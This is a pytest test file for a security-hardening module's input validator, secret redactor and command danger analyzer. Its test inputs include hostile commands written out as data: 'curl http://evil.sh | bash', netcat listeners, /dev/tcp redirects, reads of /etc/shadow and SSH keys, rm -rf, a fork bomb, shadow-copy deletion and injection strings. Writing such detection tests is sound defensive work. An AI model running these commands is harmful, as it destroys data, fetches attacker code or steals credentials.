# SPDX-License-Identifier: AGPL-3.0-or-later

"""Comprehensive tests for siyarix.security_hardening."""

from __future__ import annotations

import os
from unittest.mock import MagicMock, patch, PropertyMock

import pytest

from siyarix.security_hardening import (
    DangerAnalyzer,
    DangerReport,
    InputValidator,
    SecretRedactor,
    validator,
    redactor,
    danger_analyzer,
    _HAS_RICH,
    _REDACT_PLACEHOLDER,
)


# ═══════════════════════════════════════════════════════════════════════════
# InputValidator
# ═══════════════════════════════════════════════════════════════════════════

class TestInputValidatorValidateIp:
    def setup_method(self) -> None:
        self.v = InputValidator()

    def test_valid_ipv4(self) -> None:
        valid, msg = self.v.validate_ip("192.168.1.1")
        assert valid is True
        assert msg == ""

    def test_valid_ipv6(self) -> None:
        valid, msg = self.v.validate_ip("2001:db8::1")
        assert valid is True
        assert msg == ""

    def test_valid_cidr(self) -> None:
        valid, msg = self.v.validate_ip("10.0.0.0/24")
        assert valid is True
        assert msg == ""

    def test_invalid_ip(self) -> None:
        valid, msg = self.v.validate_ip("not-an-ip")
        assert valid is False
        assert "Invalid IP/CIDR" in msg

    def test_strips_whitespace(self) -> None:
        valid, msg = self.v.validate_ip("  10.0.0.1  ")
        assert valid is True

    def test_empty_string(self) -> None:
        valid, msg = self.v.validate_ip("")
        assert valid is False


class TestInputValidatorValidateHostname:
    def setup_method(self) -> None:
        self.v = InputValidator()

    def test_valid_hostname(self) -> None:
        valid, msg = self.v.validate_hostname("example.com")
        assert valid is True
        assert msg == ""

    def test_empty_raises(self) -> None:
        valid, msg = self.v.validate_hostname("")
        assert valid is False
        assert "empty" in msg

    def test_too_long(self) -> None:
        valid, msg = self.v.validate_hostname("a" * 254)
        assert valid is False
        assert "exceeds" in msg or "empty" in msg

    def test_invalid(self) -> None:
        valid, msg = self.v.validate_hostname("-invalid-.com")
        assert valid is False

    def test_strips_whitespace(self) -> None:
        valid, msg = self.v.validate_hostname("  example.com  ")
        assert valid is True


class TestInputValidatorValidateUrl:
    def setup_method(self) -> None:
        self.v = InputValidator()

    def test_valid_http(self) -> None:
        valid, msg = self.v.validate_url("http://example.com")
        assert valid is True
        assert msg == ""

    def test_valid_https(self) -> None:
        valid, msg = self.v.validate_url("https://example.com/path")
        assert valid is True
        assert msg == ""

    def test_invalid_scheme(self) -> None:
        valid, msg = self.v.validate_url("ftp://example.com")
        assert valid is False

    def test_invalid_format(self) -> None:
        valid, msg = self.v.validate_url("not-a-url")
        assert valid is False

    def test_strips_whitespace(self) -> None:
        valid, msg = self.v.validate_url("  https://example.com  ")
        assert valid is True


class TestInputValidatorValidateTarget:
    def setup_method(self) -> None:
        self.v = InputValidator()

    def test_empty(self) -> None:
        valid, msg = self.v.validate_target("")
        assert valid is False
        assert "Empty target" in msg

    def test_too_long(self) -> None:
        valid, msg = self.v.validate_target("a" * 4097)
        assert valid is False
        assert "exceeds maximum length" in msg

    def test_injection_detected(self) -> None:
        valid, msg = self.v.validate_target("example.com; rm -rf /")
        assert valid is False
        assert "Injection detected" in msg

    def test_injection_backtick(self) -> None:
        valid, msg = self.v.validate_target("`ls`")
        assert valid is False
        assert "Injection detected" in msg

    def test_valid_ip(self) -> None:
        valid, msg = self.v.validate_target("192.168.1.1")
        assert valid is True
        assert msg == ""

    def test_valid_hostname(self) -> None:
        valid, msg = self.v.validate_target("example.com")
        assert valid is True
        assert msg == ""

    def test_valid_url(self) -> None:
        valid, msg = self.v.validate_target("https://example.com/path")
        assert valid is True
        assert msg == ""

    def test_strips_whitespace(self) -> None:
        valid, msg = self.v.validate_target("  example.com  ")
        assert valid is True


class TestInputValidatorSanitizeArg:
    def setup_method(self) -> None:
        self.v = InputValidator()

    def test_removes_null_bytes(self) -> None:
        assert self.v.sanitize_arg("hello\x00world") == "helloworld"

    def test_removes_carriage_return(self) -> None:
        assert self.v.sanitize_arg("hello\rworld") == "helloworld"

    def test_removes_newlines(self) -> None:
        assert self.v.sanitize_arg("hello\nworld") == "helloworld"

    def test_removes_ansi_escape(self) -> None:
        assert self.v.sanitize_arg("hello\x1bworld") == "helloworld"

    def test_removes_shell_metachars(self) -> None:
        assert self.v.sanitize_arg("echo`;|&><") == "echo"

    def test_removes_command_substitution(self) -> None:
        assert self.v.sanitize_arg("$(ls)") == "ls)"
        assert self.v.sanitize_arg("${PATH}") == "PATH}"

    def test_collapses_path_traversal(self) -> None:
        assert self.v.sanitize_arg("../etc/passwd") == "etc/passwd"
        assert self.v.sanitize_arg("..\\windows\\system32") == "windows\\system32"

    def test_strips_whitespace(self) -> None:
        assert self.v.sanitize_arg("  hello  ") == "hello"

    def test_clean_arg_unchanged(self) -> None:
        assert self.v.sanitize_arg("hello") == "hello"

    def test_url_encoded_decoded_before_sanitize(self) -> None:
        result = self.v.sanitize_arg("%3B%26%7C")
        assert ";" not in result
        assert "&" not in result
        assert "|" not in result

    def test_empty_string(self) -> None:
        assert self.v.sanitize_arg("") == ""


class TestInputValidatorSanitizeArgs:
    def setup_method(self) -> None:
        self.v = InputValidator()

    def test_sanitizes_all_args(self) -> None:
        result = self.v.sanitize_args(["hi", "hello\x00world", "$(ls)"])
        assert result == ["hi", "helloworld", "ls)"]

    def test_empty_list(self) -> None:
        assert self.v.sanitize_args([]) == []


class TestInputValidatorHasInjection:
    def setup_method(self) -> None:
        self.v = InputValidator()

    def test_shell_pipe(self) -> None:
        found, name = self.v.has_injection("echo;ls")
        assert found is True
        assert name == "shell_pipe"

    def test_command_substitution(self) -> None:
        found, name = self.v.has_injection("$(cat /etc/passwd)")
        assert found is True
        assert name == "command_substitution"

    def test_path_traversal(self) -> None:
        found, name = self.v.has_injection("../etc/passwd")
        assert found is True
        assert name in ("path_traversal", "path_traversal_backslash")

    def test_encoded_path_traversal(self) -> None:
        found, name = self.v.has_injection("%2e%2e/test")
        assert found is True
        assert name == "path_traversal_encoded"

    def test_null_byte(self) -> None:
        found, name = self.v.has_injection("hello\x00world")
        assert found is True
        assert name == "null_byte"

    def test_newline(self) -> None:
        found, name = self.v.has_injection("hello\nworld")
        assert found is True
        assert name == "newline_injection"

    def test_format_string(self) -> None:
        found, name = self.v.has_injection("%s")
        assert found is True
        assert name == "format_string"

    def test_sql_keyword(self) -> None:
        found, name = self.v.has_injection("DROP TABLE users'")
        assert found is True
        assert name == "sql_keyword"

    def test_redirect(self) -> None:
        found, name = self.v.has_injection("echo > file")
        assert found is True
        name == "redirect"

    def test_backtick_exec(self) -> None:
        found, name = self.v.has_injection("`ls`")
        assert found is True
        name == "backtick_exec"

    def test_clean_string(self) -> None:
        found, name = self.v.has_injection("example.com")
        assert found is False
        assert name == ""

    def test_empty_string(self) -> None:
        found, name = self.v.has_injection("")
        assert found is False
        assert name == ""


class TestInputValidatorCheckArgsInjection:
    def setup_method(self) -> None:
        self.v = InputValidator()

    def test_clean_args(self) -> None:
        found, name = self.v.check_args_injection(["example.com", "80"])
        assert found is False
        assert name == ""

    def test_dirty_arg_detected(self) -> None:
        found, name = self.v.check_args_injection(["hi", "echo;ls"])
        assert found is True
        assert name == "shell_pipe"

    def test_empty_list(self) -> None:
        found, name = self.v.check_args_injection([])
        assert found is False
        assert name == ""

    def test_first_dirty_arg_wins(self) -> None:
        found, name = self.v.check_args_injection(["`ls`", "DROP TABLE users'", "hi"])
        assert found is True
        assert name == "shell_pipe"


# ═══════════════════════════════════════════════════════════════════════════
# SecretRedactor
# ═══════════════════════════════════════════════════════════════════════════

class TestSecretRedactorRedact:
    def setup_method(self) -> None:
        self.r = SecretRedactor()

    def test_openai_key(self) -> None:
        text = "sk-abc123xyz456def789ghi"
        result = self.r.redact(text)
        assert "[REDACTED]" in result
        assert "sk-abc123xyz456def789ghi" not in result

    def test_aws_access_key(self) -> None:
        text = "AKIA1234567890123456"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_aws_secret_key_preserves_key_name(self) -> None:
        text = "aws_secret_access_key = mysupersecretkey123"
        result = self.r.redact(text)
        assert "aws_secret_access_key = [REDACTED]" in result

    def test_anthropic_key(self) -> None:
        text = "sk-ant-abc123def456ghi789jkl012"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_deepseek_key(self) -> None:
        text = "sk-dsabc123def456ghi789jkl012345"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_xai_key(self) -> None:
        text = "xai-abc123def456ghi789jkl012345"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_mistral_api_key_redacted(self) -> None:
        text = "MISTRAL_API_KEY = abc123def456"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_bearer_token(self) -> None:
        text = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNqPnd9dQNcP"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_basic_auth(self) -> None:
        text = "Basic dXNlcjpwYXNz"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_github_token(self) -> None:
        text = "ghp_abcdefghijklmnopqrstuvwxyz1234567890"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_generic_api_key_preserves_key_name(self) -> None:
        text = "api_key = 'sk-live-abcdefghijklmnopqrst'"
        result = self.r.redact(text)
        assert "api_key = '[REDACTED]" in result

    def test_gcp_service_account(self) -> None:
        text = '"type": "service_account"'
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_azure_connection_string(self) -> None:
        text = "DefaultEndpointsProtocol=https;AccountKey=abc123==;"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_url_password(self) -> None:
        text = "http://user:password123@example.com"
        result = self.r.redact(text)
        assert "password123" in result
        assert "http" in result

    def test_private_key_marker(self) -> None:
        text = "-----BEGIN RSA PRIVATE KEY-----"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_secret_kv_redacted(self) -> None:
        text = "password = super_secret_123"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_jwt_token(self) -> None:
        text = "eyJhbGciOiJIUzI1NiJ9aaaa.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNqPnd9dQNcPaaaa"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_slack_token(self) -> None:
        text = "xoxb-1234567890-abcdefghij"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_google_api_key(self) -> None:
        text = "AIzaSyD7Kj8Mk9L0PaQbRcVfWgXnYz1Q2R3S4T5U6"
        result = self.r.redact(text)
        assert "[REDACTED]" in result

    def test_clean_text_unchanged(self) -> None:
        text = "hello world, this is safe"
        assert self.r.redact(text) == text

    def test_empty_string(self) -> None:
        assert self.r.redact("") == ""

    def test_no_false_positive_short(self) -> None:
        text = "sk-"  # too short
        assert self.r.redact(text) == text


class TestSecretRedactorIsSensitiveKey:
    def setup_method(self) -> None:
        self.r = SecretRedactor()

    def test_password(self) -> None:
        assert self.r.is_sensitive_key("password") is True

    def test_api_key(self) -> None:
        assert self.r.is_sensitive_key("api_key") is True

    def test_authorization_header(self) -> None:
        assert self.r.is_sensitive_key("Authorization") is True

    def test_case_insensitive(self) -> None:
        assert self.r.is_sensitive_key("SECRET") is True

    def test_hyphen_as_underscore(self) -> None:
        assert self.r.is_sensitive_key("api-key") is True

    def test_innocent_key(self) -> None:
        assert self.r.is_sensitive_key("username") is False

    def test_empty_string(self) -> None:
        assert self.r.is_sensitive_key("") is False

    def test_credential_key(self) -> None:
        assert self.r.is_sensitive_key("my_credential") is True


class TestSecretRedactorRedactDict:
    def setup_method(self) -> None:
        self.r = SecretRedactor()

    def test_redacts_sensitive_key(self) -> None:
        d = {"password": "mysecret", "name": "user"}
        result = self.r.redact_dict(d)
        assert result["password"] == "[REDACTED]"
        assert result["name"] == "user"

    def test_redacts_nested_dict(self) -> None:
        d = {"config": {"api_key": "sk-abc"}, "safe": "ok"}
        result = self.r.redact_dict(d)
        assert result["config"]["api_key"] == "[REDACTED]"
        assert result["safe"] == "ok"

    def test_redacts_nested_list(self) -> None:
        d = {"items": ["safe", "sk-abc123def456ghijklmno", "also safe"]}
        result = self.r.redact_dict(d)
        assert "[REDACTED]" in str(result["items"])

    def test_original_unchanged(self) -> None:
        d = {"password": "secret"}
        self.r.redact_dict(d)
        assert d["password"] == "secret"  # original not mutated

    def test_empty_dict(self) -> None:
        assert self.r.redact_dict({}) == {}

    def test_deep_nesting(self) -> None:
        d = {"a": {"b": {"c": [{"password": "secret"}]}}}
        result = self.r.redact_dict(d)
        assert result["a"]["b"]["c"][0]["password"] == "[REDACTED]"

    def test_list_with_dicts(self) -> None:
        d = {"users": [{"name": "alice"}, {"token": "ghp_abc"}]}
        result = self.r.redact_dict(d)
        assert result["users"][1]["token"] == "[REDACTED]"
        assert result["users"][0]["name"] == "alice"

    def test_non_string_values_preserved(self) -> None:
        d = {"count": 123, "enabled": True, "api_key": "sk-abc"}
        result = self.r.redact_dict(d)
        assert result["count"] == 123
        assert result["enabled"] is True
        assert result["api_key"] == "[REDACTED]"

    def test_none_value(self) -> None:
        d = {"key": None, "password": None}
        result = self.r.redact_dict(d)
        assert result["key"] is None
        assert result["password"] is None


class TestSecretRedactorRedactEnv:
    def setup_method(self) -> None:
        self.r = SecretRedactor()

    @patch.dict(os.environ, {"MY_PASSWORD": "supersecret", "MY_USER": "alice"}, clear=True)
    def test_redacts_sensitive_env_keys(self) -> None:
        result = self.r.redact_env()
        assert result["MY_PASSWORD"] == "[REDACTED]"
        assert result["MY_USER"] == "alice"

    @patch.dict(os.environ, {"API_KEY": "sk-abc123xyz456def789ghi"}, clear=True)
    def test_redacts_api_key_env_value(self) -> None:
        result = self.r.redact_env()
        assert "[REDACTED]" in result["API_KEY"]

    @patch.dict(os.environ, {"SAFE_VAR": "hello"}, clear=True)
    def test_keeps_safe_values(self) -> None:
        result = self.r.redact_env()
        assert result["SAFE_VAR"] == "hello"


# ═══════════════════════════════════════════════════════════════════════════
# DangerReport
# ═══════════════════════════════════════════════════════════════════════════

class TestDangerReport:
    def test_requires_confirmation_critical(self) -> None:
        r = DangerReport(is_dangerous=True, severity="critical")
        assert r.requires_confirmation is True

    def test_requires_confirmation_high(self) -> None:
        r = DangerReport(is_dangerous=True, severity="high")
        assert r.requires_confirmation is True

    def test_requires_confirmation_medium(self) -> None:
        r = DangerReport(is_dangerous=True, severity="medium")
        assert r.requires_confirmation is True

    def test_no_confirmation_needed_low(self) -> None:
        r = DangerReport(is_dangerous=True, severity="low")
        assert r.requires_confirmation is False

    def test_no_confirmation_needed_info(self) -> None:
        r = DangerReport(is_dangerous=True, severity="info")
        assert r.requires_confirmation is False

    def test_no_confirmation_needed_safe(self) -> None:
        r = DangerReport(is_dangerous=False, severity="safe")
        assert r.requires_confirmation is False

    def test_defaults(self) -> None:
        r = DangerReport(is_dangerous=False, severity="safe")
        assert r.reasons == []
        assert r.recommendation == ""
        assert r.matched_patterns == []


# ═══════════════════════════════════════════════════════════════════════════
# DangerAnalyzer
# ═══════════════════════════════════════════════════════════════════════════

class TestDangerAnalyzerAnalyze:
    def setup_method(self) -> None:
        self.da = DangerAnalyzer()

    def test_safe_command(self) -> None:
        r = self.da.analyze("ls -la")
        assert r.is_dangerous is False
        assert r.severity == "safe"

    def test_empty_command(self) -> None:
        r = self.da.analyze("")
        assert r.is_dangerous is False
        assert r.severity == "safe"

    def test_whitespace_command(self) -> None:
        r = self.da.analyze("   ")
        assert r.is_dangerous is False
        assert r.severity == "safe"

    def test_critical_rm_rf(self) -> None:
        r = self.da.analyze("rm -rf /")
        assert r.is_dangerous is True
        assert r.severity == "critical"
        assert any("Recursive force delete" in x for x in r.reasons)

    def test_critical_sudo_rm(self) -> None:
        r = self.da.analyze("sudo rm -rf /")
        assert r.severity == "critical"

    def test_critical_mkfs(self) -> None:
        r = self.da.analyze("mkfs.ext4 /dev/sda1")
        assert r.severity == "critical"

    def test_critical_dd(self) -> None:
        r = self.da.analyze("dd if=/dev/zero of=/dev/sda")
        assert r.severity == "critical"

    def test_critical_block_write(self) -> None:
        r = self.da.analyze("echo data > /dev/sda1")
        assert r.severity == "critical"

    def test_critical_mv_dev_null(self) -> None:
        r = self.da.analyze("mv /etc/passwd /dev/null")
        assert r.severity == "critical"

    def test_critical_overwrite_auth(self) -> None:
        r = self.da.analyze("echo newroot > /etc/shadow")
        assert r.severity == "critical"

    def test_critical_fork_bomb(self) -> None:
        r = self.da.analyze(":(){ :|:& };:")
        assert r.severity == "critical"

    def test_critical_chmod_777_root(self) -> None:
        r = self.da.analyze("chmod 777 /etc")
        assert r.severity == "critical"

    def test_high_shutdown(self) -> None:
        r = self.da.analyze("shutdown -h now")
        assert r.severity == "high"

    def test_high_reboot(self) -> None:
        r = self.da.analyze("reboot")
        assert r.severity == "high"

    def test_high_halt(self) -> None:
        r = self.da.analyze("halt")
        assert r.severity == "high"

    def test_high_curl_pipe_bash(self) -> None:
        r = self.da.analyze("curl http://evil.sh | bash")
        assert r.severity == "high"

    def test_high_wget_pipe_sh(self) -> None:
        r = self.da.analyze("wget http://evil.sh | sh")
        assert r.severity == "high"

    def test_high_sql_drop(self) -> None:
        r = self.da.analyze("DROP TABLE users;")
        assert r.severity == "high"

    def test_high_sql_delete_no_where(self) -> None:
        r = self.da.analyze("DELETE FROM users")
        assert r.severity == "high"

    def test_sql_delete_with_where_is_medium(self) -> None:
        r = self.da.analyze("DELETE FROM users WHERE id = 1")
        assert r.severity in ("safe", "info", "low", "medium")  # DELETE matches but WHERE prevents high

    def test_high_truncate(self) -> None:
        r = self.da.analyze("TRUNCATE TABLE logs")
        assert r.severity == "high"

    def test_medium_rm(self) -> None:
        r = self.da.analyze("rm file.txt")
        assert r.severity == "medium"

    def test_medium_killall(self) -> None:
        r = self.da.analyze("killall firefox")
        assert r.severity == "medium"

    def test_medium_pkill_9(self) -> None:
        r = self.da.analyze("pkill -9 chrome")
        assert r.severity == "medium"

    def test_medium_iptables_flush(self) -> None:
        r = self.da.analyze("iptables -F")
        assert r.severity == "medium"

    def test_medium_ufw_disable(self) -> None:
        r = self.da.analyze("ufw disable")
        assert r.severity == "medium"

    def test_medium_systemctl_stop(self) -> None:
        r = self.da.analyze("systemctl stop apache2")
        assert r.severity == "medium"

    def test_medium_netcat_listener(self) -> None:
        r = self.da.analyze("nc -lvnp 4444")
        assert r.severity == "medium"

    def test_medium_python_socket(self) -> None:
        r = self.da.analyze("python3 -c 'import socket'")
        assert r.severity == "medium"

    def test_medium_dev_tcp(self) -> None:
        r = self.da.analyze("echo test > /dev/tcp/192.168.1.1/4444")
        assert r.severity == "medium"

    def test_medium_xmrig(self) -> None:
        r = self.da.analyze("xmrig --url=pools.example.com:3333")
        assert r.severity == "medium"

    def test_medium_crontab_edit(self) -> None:
        r = self.da.analyze("crontab -e")
        assert r.severity == "medium"

    def test_medium_modify_rc(self) -> None:
        r = self.da.analyze("echo alias ll='ls -la' >> ~/.bashrc")
        assert r.severity == "medium"

    def test_high_base64_decode_pipe(self) -> None:
        r = self.da.analyze("echo 'cHcgZGVzdHJveQ==' | base64 -d | bash")
        assert r.severity == "high"

    def test_critical_cat_shadow(self) -> None:
        r = self.da.analyze("cat /etc/shadow")
        assert r.severity == "critical"

    def test_critical_ssh_key_exfil(self) -> None:
        r = self.da.analyze("cat ~/.ssh/id_rsa")
        assert r.severity == "critical"

    def test_windows_format(self) -> None:
        r = self.da.analyze("format C:")
        assert r.severity == "critical"

    def test_windows_del_force(self) -> None:
        r = self.da.analyze("del /F C:\\windows\\system32")
        assert r.severity == "critical"

    def test_windows_rmdir_recursive(self) -> None:
        r = self.da.analyze("rmdir /S C:\\temp")
        assert r.severity == "critical"

    def test_windows_reg_delete_hklm(self) -> None:
        r = self.da.analyze("reg delete HKLM\\Software")
        assert r.severity == "critical"

    def test_windows_reg_delete_run(self) -> None:
        r = self.da.analyze('reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run')
        assert r.severity == "high"

    def test_windows_bcdedit(self) -> None:
        r = self.da.analyze("bcdedit /set {default} bootsequence")
        assert r.severity == "critical"

    def test_windows_diskpart(self) -> None:
        r = self.da.analyze("diskpart")
        assert r.severity == "high"

    def test_windows_vssadmin(self) -> None:
        r = self.da.analyze("vssadmin delete shadows")
        assert r.severity == "high"

    def test_windows_wmic_delete(self) -> None:
        r = self.da.analyze("wmic shadowcopy delete")
        assert r.severity == "high"

    def test_windows_wevtutil(self) -> None:
        r = self.da.analyze("wevtutil cl system")
        assert r.severity == "high"

    def test_windows_clear_eventlog(self) -> None:
        r = self.da.analyze("Clear-EventLog -LogName System")
        assert r.severity == "high"

    def test_windows_cipher(self) -> None:
        r = self.da.analyze("cipher /w:C:")
        assert r.severity == "medium"

    def test_windows_net_user_delete(self) -> None:
        r = self.da.analyze("net user /delete baduser")
        assert r.severity == "medium"

    def test_windows_powershell_encoded(self) -> None:
        r = self.da.analyze("powershell -EncodedCommand SGVsbG8=")
        assert r.severity == "medium"

    def test_windows_sc_stop(self) -> None:
        r = self.da.analyze("sc stop wuauserv")
        assert r.severity == "medium"

    def test_windows_reg_add_run_hklm(self) -> None:
        r = self.da.analyze("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Evil /t REG_SZ /d cmd.exe")
        assert r.severity == "medium"

    def test_windows_reg_add_run_hkcu(self) -> None:
        r = self.da.analyze("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Evil /t REG_SZ /d cmd.exe")
        assert r.severity == "medium"

    def test_windows_schtasks_create(self) -> None:
        r = self.da.analyze("schtasks /create /tn evil")
        assert r.severity == "medium"

    def test_windows_schtasks_delete(self) -> None:
        r = self.da.analyze("schtasks /delete /tn evil")
        assert r.severity == "high"

    def test_windows_get_wmi_delete(self) -> None:
        r = self.da.analyze("Get-WmiObject Win32_ShadowCopy | foreach { $_.Delete() }")
        assert r.severity == "medium"

    def test_windows_remove_item_recurse(self) -> None:
        r = self.da.analyze("Remove-Item -Recurse C:\\temp")
        assert r.severity == "high"

    def test_windows_remove_item_drive_wipe(self) -> None:
        r = self.da.analyze("Remove-Item C:\\")
        assert r.severity == "high"

    def test_windows_del_recursive(self) -> None:
        r = self.da.analyze("del /F /S C:\\*")
        assert r.severity == "high"

    def test_windows_get_childitem_piped_remove(self) -> None:
        r = self.da.analyze("Get-ChildItem -Recurse | Remove-Item")
        assert r.severity == "high"

    def test_info_sudo(self) -> None:
        r = self.da.analyze("sudo apt update")
        assert r.severity == "info"

    def test_low_chmod(self) -> None:
        r = self.da.analyze("chmod 755 file.sh")
        assert r.severity == "low"

    def test_low_chown(self) -> None:
        r = self.da.analyze("chown user:group file")
        assert r.severity == "low"

    def test_low_crontab(self) -> None:
        r = self.da.analyze("crontab -l")
        assert r.severity == "low"

    def test_recommendation_critical(self) -> None:
        r = self.da.analyze("rm -rf /")
        assert "BLOCK" in r.recommendation

    def test_recommendation_high(self) -> None:
        r = self.da.analyze("shutdown -h now")
        assert "CONFIRM" in r.recommendation

    def test_recommendation_medium(self) -> None:
        r = self.da.analyze("rm file.txt")
        assert "CAUTION" in r.recommendation

    def test_recommendation_low(self) -> None:
        r = self.da.analyze("chmod 755 file.sh")
        assert "INFO" in r.recommendation

    def test_recommendation_info(self) -> None:
        r = self.da.analyze("sudo apt update")
        assert "NOTE" in r.recommendation

    def test_matched_patterns_present(self) -> None:
        r = self.da.analyze("rm -rf /")
        assert len(r.matched_patterns) > 0

    def test_multiple_patterns_all_reported(self) -> None:
        r = self.da.analyze("sudo rm -rf /")
        assert len(r.reasons) >= 2


class TestDangerAnalyzerFormatWarning:
    def setup_method(self) -> None:
        self.da = DangerAnalyzer()

    def test_safe_report_does_nothing(self) -> None:
        r = DangerReport(is_dangerous=False, severity="safe")
        # should not raise
        self.da.format_warning(r)

    @patch("siyarix.security_hardening._HAS_RICH", False)
    def test_no_rich_logs_warning(self) -> None:
        r = DangerReport(
            is_dangerous=True,
            severity="critical",
            reasons=["[CRITICAL] rm -rf"],
            recommendation="BLOCK",
        )
        with patch("siyarix.security_hardening.logger.warning") as mock_log:
            self.da.format_warning(r)
            mock_log.assert_called_once()

    @patch("siyarix.security_hardening._HAS_RICH", True)
    @patch("siyarix.security_hardening.Console")
    def test_with_rich_console(self, mock_console_class: MagicMock) -> None:
        mock_console = MagicMock()
        mock_console_class.return_value = mock_console
        r = DangerReport(
            is_dangerous=True,
            severity="high",
            reasons=["[HIGH] System shutdown"],
            recommendation="CONFIRM",
        )
        self.da.format_warning(r)
        mock_console.print.assert_called_once()

    @patch("siyarix.security_hardening._HAS_RICH", True)
    @patch("siyarix.security_hardening.Console")
    def test_with_explicit_console(self, mock_console_class: MagicMock) -> None:
        mock_explicit = MagicMock()
        r = DangerReport(
            is_dangerous=True,
            severity="medium",
            reasons=["[MEDIUM] rm"],
            recommendation="CAUTION",
        )
        self.da.format_warning(r, console=mock_explicit)
        mock_explicit.print.assert_called_once()
        mock_console_class.assert_not_called()

    @patch("siyarix.security_hardening._HAS_RICH", True)
    @patch("siyarix.security_hardening.Console")
    def test_all_severity_levels(self, mock_console_class: MagicMock) -> None:
        for sev in ("critical", "high", "medium", "low", "info"):
            mock_console = MagicMock()
            mock_console_class.return_value = mock_console
            r = DangerReport(is_dangerous=True, severity=sev, reasons=[f"[{sev.upper()}] test"])
            self.da.format_warning(r)
            mock_console.print.assert_called_once()


class TestDangerAnalyzerGetDangerSummary:
    def setup_method(self) -> None:
        self.da = DangerAnalyzer()

    def test_safe(self) -> None:
        assert self.da.get_danger_summary("ls -la") == "safe"

    def test_critical(self) -> None:
        summary = self.da.get_danger_summary("rm -rf /")
        assert "CRITICAL" in summary
        assert "Recursive force delete" in summary

    def test_high(self) -> None:
        summary = self.da.get_danger_summary("shutdown -h now")
        assert "HIGH" in summary

    def test_empty(self) -> None:
        assert self.da.get_danger_summary("") == "safe"


# ═══════════════════════════════════════════════════════════════════════════
# Module-level singletons
# ═══════════════════════════════════════════════════════════════════════════

class TestSingletons:
    def test_validator(self) -> None:
        assert isinstance(validator, InputValidator)

    def test_redactor(self) -> None:
        assert isinstance(redactor, SecretRedactor)

    def test_danger_analyzer(self) -> None:
        assert isinstance(danger_analyzer, DangerAnalyzer)
